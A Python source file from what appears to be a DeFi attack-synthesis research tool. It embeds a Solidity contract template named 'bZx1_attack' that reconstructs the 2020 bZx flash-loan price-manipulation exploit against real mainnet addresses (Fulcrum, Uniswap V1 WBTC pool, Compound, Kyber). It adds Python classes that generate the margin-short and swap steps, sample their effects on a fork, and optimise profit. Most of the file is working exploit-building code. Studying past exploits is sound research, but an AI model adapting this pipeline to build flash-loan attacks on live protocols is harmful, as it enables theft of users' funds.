import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict

from Actions.Utils import *
from Actions.UtilsPrecision import *


class bZx1Action():
    initialStates = [77, 2817]  # [77.08, 2817.77]
    globalStates = initialStates.copy()

    startStr_contract = """// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interfaces/bZx1I.sol";
// Block 9484688
// Block index 28
// Timestamp  Sat, 15 Feb 2020 01:38:57 +0000
// Gas price  10 gwei
// Gas limit  5000000
// Exploit Contract: 0xb5c8bd9430b6cc87a0e2fe110ece6bf527fa4f170a4bc8cd032f768fc5219838


contract bZx1_attack {
    address private dydxAddress = 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e;
    address private WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private WBTCAddress = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address private cEthAddress = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address private cWBTCAddress = 0xC11b1268C1A384e55C48c2391d8d480264A3A7F4;
    address private ComptrollerAddress = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address private UniswapWBTCAddress = 0x4d2f5cFbA55AE412221182D8475bC85799A5644b;

    address private FulcrumsETHwBTC5xAddress = 0xb0200B0677dD825bb32B93d055eBb9dc3521db9D;
    address private KyberAddress = 0x818E6FECD516Ecc3849DAf6845e3EC868087B755;
    address private EOA;

    FulcrumShort private FulcrumsETHwBTC = FulcrumShort(FulcrumsETHwBTC5xAddress);
    IWETH private WETH = IWETH(WETHAddress);
    IWBTC private WBTC = IWBTC(WBTCAddress);
    ICEther private cETH = ICEther(payable(cEthAddress));
    IcWBTC private cWBTC = IcWBTC(cWBTCAddress);
    UniswapExchangeInterface private exchange = UniswapExchangeInterface(UniswapWBTCAddress);
    SimpleNetworkInterface private Kyber = SimpleNetworkInterface(KyberAddress);


    uint256 balance1 = 0;
    uint256 balance2 = 0;
    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";
    uint256 mintAmountETH = 0;
    uint256 borrowAmountBTC = 0;

    constructor() payable {
        require(msg.value == 4500 ether, "loan amount does not match");
        EOA = msg.sender;
        WBTC.approve(UniswapWBTCAddress, 2**256 - 1);
        WBTC.approve(cWBTCAddress, 2**256 - 1);
        // --------------------------------------------------------------------
    }

    receive() external payable {}
  """

    startStr_attack = """
    // flashloan amount: 4500 ETH and 112 WBTC
    function attack($$_$$) public {

                """

    endStr_attack = """
        revert(ProfitSummary());

    }
"""

    endStr_contract = """

    function UniswapV1StateSummary() internal returns   (string memory _uintAsString){
        balance1 = WBTC.balanceOf(UniswapWBTCAddress);
        balance2 = UniswapWBTCAddress.balance;
        str1 = append("WBTC balance: ", uint2str(balance1));
        str2 = append(" ETH balance: ", uint2str(balance2));
        return append(str1, str2);
    }


    function ProfitSummary() internal returns (string memory _uintAsString){
        balance1 = address(this).balance;  // ETH earned
        balance2 = WBTC.balanceOf(address(this)); // WBTC spent
        str1 = appendWithSpace(uint2str(balance1), uint2str(balance2));
        return str1;
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }
    
    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }
}
                                """

    initialBalances = {"ETH": 4500, "WBTC": 112}
    currentBalances = {"ETH": 4500, "WBTC": 112}
    TargetTokens = {'ETH', 'WBTC'}
    TokenPrices = {"ETH": 1.0, "WBTC": 39.08}



    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    def calcProfit(stats):
        if stats == None or len(stats) != 2:
            return 0
        ETH_earned = stats[0] / 10 ** 18 - 4500
        WBTC_cost = 112 - stats[1] / 10 ** 8
        return ETH_earned - 39.08 * WBTC_cost

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit

    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)
        
    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)

    def initialPass():
        action1 = SwapUniswapWBTC2ETH
        action2 = MarginShort
       
        # action_list_1 = [action1, action2]
        # action1_prestate_dependency = [action1, action2]
        # action2_prestate_dependency = [action1]
        # # seq of actions
        # ActionWrapper = bZx1Action
        # action_lists = [action1_prestate_dependency +
        #                 [action1], action2_prestate_dependency + [action2]]
        action3 = SwapUniswapETH2WBTC
        action_list_1 = [action1, action2, action3]
        action1_prestate_dependency = [action2, action3]
        action2_prestate_dependency = [action1, action3]
        action3_prestate_dependency = [action1, action2]
        # seq of actions
        ActionWrapper = bZx1Action
        action_lists = [action1_prestate_dependency +[action1], \
                        action2_prestate_dependency + [action2], \
                        action3_prestate_dependency + [action3]]


        start = time.time()
        initialPassCollectData( action_lists, ActionWrapper, 500)
        ShowDataPointsForEachAction( action_list_1 )
        end = time.time()
        print("in total it takes %f seconds" % (end - start))


    def runinitialPass():
        return


class SwapUniswapWBTC2ETH(bZx1Action):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 1
    tokensIn = ['WBTC']
    tokensOut = ['ETH']
    range = [0, 200]  # 112

    @classmethod
    def actionStr(cls):
        action = "      // Action: SwapUniswapWBTC2ETH\n"
        action += '''       exchange.tokenToEthSwapInput($$ * 10 ** 8, 1, 0xffffffff);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: SwapUniswapWBTC2ETH\n"
        action += "         str3 = UniswapV1StateSummary();\n"
        action += "         uint ETHstart = address(this).balance; \n"
        action += '''       exchange.tokenToEthSwapInput($$ * 10 ** 8, 1, 0xffffffff);\n'''
        action += "         ETHstart = address(this).balance - ETHstart; \n"
        action += "         str4 = UniswapV1StateSummary();\n"
        action += "         revert(appendWithSpace(str3, appendWithSpace(str4, uint2str(ETHstart))  ));\n"
        return action

    @classmethod
    def aliquotValues(cls, values):
        return values[2] // 10 ** 8, values[3] // 10 ** 18, values[4] // 10 ** 18

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0] // 10 ** 8, values[1] // 10 ** 18, inputs[-1]]
        if point in cls.points:
            # print("Now it's the time")
            # index = cls.points.index(point)
            # print( cls.values[0][index], cls.values[1][index], cls.values[2][index] )
            return -2

        cls.points.append(point)   # Uniswap DAI reserve
        # Uniswap WBTC reserve
        # WBTC In
        cls.values[0].append(
            values[2] // 10 ** 8)  # Uniswap WBTC reserve
        cls.values[1].append(
            values[3] // 10 ** 18)  # Uniswap ETH reserve
        cls.values[2].append(values[4] // 10 ** 18)  # WETHOut

        cls.hasNewDataPoints = True

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0],
                  cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        return output0, output1, output2

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        cls.currentBalances['WBTC'] -= input
        output0, output1, output2 = cls.simulate(input)
        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.currentBalances["ETH"] += output2
        return

    @classmethod
    def string(cls):
        return cls.__name__

class SwapUniswapETH2WBTC(bZx1Action):
    points = []
    values = [[], [], []]

    hasNewDataPoints = True
    approximator0 = None
    approximator1 = None
    approximator2 = None

    numInputs = 1
    tokensIn = ['ETH']
    tokensOut = ['WBTC']
    range = [0, 5000]  # guess

    @classmethod
    def actionStr(cls):
        action = "      // Action: SwapUniswapETH2WBTC\n"
        action += '''       exchange.ethToTokenSwapInput{value: $$ * 1e18}(1, 0xffffffff);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: SwapUniswapETH2WBTC\n"
        action += "         str3 = UniswapV1StateSummary();\n"
        action += "         uint WBTCgot = WBTC.balanceOf(address(this)); \n"
        action += '''       exchange.ethToTokenSwapInput{value: $$ * 1e18}(1, 0xffffffff);\n'''
        action += "         WBTCgot = WBTC.balanceOf(address(this)) - WBTCgot; \n"
        action += "         str4 = UniswapV1StateSummary();\n"
        action += "         revert(appendWithSpace(str3, appendWithSpace(str4, uint2str(WBTCgot))  ));\n"
        return action

    @classmethod
    def aliquotValues(cls, values):
        return values[2] // 10 ** 8, values[3] // 10 ** 18, values[4] // 10 ** 8

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 5:
            return -1

        point = [values[0] // 10 ** 8, values[1] // 10 ** 18, inputs[-1]]
        if point in cls.points:
            return -2

        cls.points.append(point)  
        # Uniswap WBTC reserve
        # WBTC In
        cls.values[0].append(values[2] // 10 ** 8) 
        cls.values[1].append(values[3] // 10 ** 18)  
        cls.values[2].append(values[4] // 10 ** 8)  # WBTC out

        cls.hasNewDataPoints = True

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])
        cls.approximator2 = NumericalApproximator(cls.points, cls.values[2])
        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0], cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        output2 = cls.approximator2(inputs)
        return output0, output1, output2

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()
        cls.currentBalances['ETH'] -= input
        output0, output1, output2 = cls.simulate(input)
        cls.globalStates[0] = output0
        cls.globalStates[1] = output1
        cls.currentBalances["WBTC"] += output2
        return

    @classmethod
    def string(cls):
        return cls.__name__


class MarginShort(bZx1Action):
    points = []
    values = [[], []]
    approximator0 = None
    approximator1 = None

    hasNewDataPoints = True

    numInputs = 1
    tokensIn = ['ETH']
    tokensOut = []
    range = [0, 2000]  # 1300

    @classmethod
    def actionStr(cls):
        action = "      // Action: MarginShort\n"
        action += '''       FulcrumsETHwBTC.mintWithEther{value: $$ * 1e18}(address(this), 0);\n'''
        return action

    @classmethod
    def collectorStr(cls):
        action = "      // Collect: MarginShort\n"
        action += "         str3 = UniswapV1StateSummary();\n"
        action += '''       FulcrumsETHwBTC.mintWithEther{value: $$ * 1e18}(address(this), 0);\n'''
        action += "         str4 = UniswapV1StateSummary();\n"
        action += "         revert(appendWithSpace(str3, str4));\n"
        return action

    @classmethod
    def aliquotValues(cls, values):
        return values[2] // 10 ** 8, values[3] // 10 ** 18

    @classmethod
    def add1PointValue(cls, inputs, values):
        # input = inputs[-1]
        if values == None or len(values) != 4:
            return -1
        if [values[0] // 10 ** 8, values[1] // 10 ** 18, inputs[-1]] in cls.points:
            return -2

        cls.points.append(
            [values[0] // 10 ** 8, values[1] // 10 ** 18, inputs[-1]])   # Uniswap DAI reserve
        # Uniswap WBTC reserve
        # ETH In
        cls.values[0].append(values[2] // 10 ** 8)  # Uniswap WBTC reserve
        cls.values[1].append(values[3] // 10 ** 18)  # Uniswap ETH reserve

        return 1

    @classmethod
    def refreshTransitFormula(cls):
        cls.approximator0 = NumericalApproximator(cls.points, cls.values[0])
        cls.approximator1 = NumericalApproximator(cls.points, cls.values[1])

        cls.hasNewDataPoints = False

    @classmethod
    def simulate(cls, input):
        inputs = [cls.globalStates[0],
                  cls.globalStates[1], input]
        output0 = cls.approximator0(inputs)
        output1 = cls.approximator1(inputs)
        return output0, output1

    @classmethod
    def transit(cls, input):  # Assume input is a value
        if cls.hasNewDataPoints:
            cls.refreshTransitFormula()

        cls.currentBalances['ETH'] -= input

        output0, output1 = cls.simulate(input)

        cls.globalStates[0] = output0
        cls.globalStates[1] = output1

    @classmethod
    def string(cls):
        return cls.__name__




def main():
    # config.method
    # config.contract_name
    # config.initialEther
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 0
    config.ETHorBSCorDVDorFantom = 0
    config.initialEther = 12500
    config.blockNum = 9484688
    config.contract_name = "bZx1_attack"

    bZx1Action.initialPass()

    # bZx1Action.runinitialPass()

    # action1 = SwapUniswapWBTC2ETH
    # action2 = MarginShort

    # ActionWrapper = bZx1Action


    # action_list = [action2, action1]
    # initial_guess = [1300, 112]

    # # Optimize(action_list, ActionWrapper)

    # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

    # actual_profit = 1194.4527388702236
    # print("actual profit: ", actual_profit)
    # e1, e2, e3, e4 = testCounterExampleDrivenApprox(initial_guess, ActionWrapper, action_list)
    # return actual_profit, e1, e2, e3, e4



if __name__ == '__main__':
    main()
    